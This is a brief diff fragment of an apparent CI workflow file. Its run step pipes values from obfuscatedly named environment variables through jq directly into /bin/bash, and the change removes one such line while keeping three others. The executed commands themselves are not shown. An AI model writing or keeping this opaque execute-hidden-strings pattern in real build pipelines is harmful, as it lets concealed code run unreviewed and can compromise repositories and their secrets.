@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$c6" | jq -r .zgya83 | /bin/bash
           echo $lwd1 | jq -r .ubrof863 | /bin/bash
-          echo $qci017 | jq -r .qf62 | /bin/bash
           echo $n36 | jq -r .asvlu16 | /bin/bash
 
       - name: Upload artifact
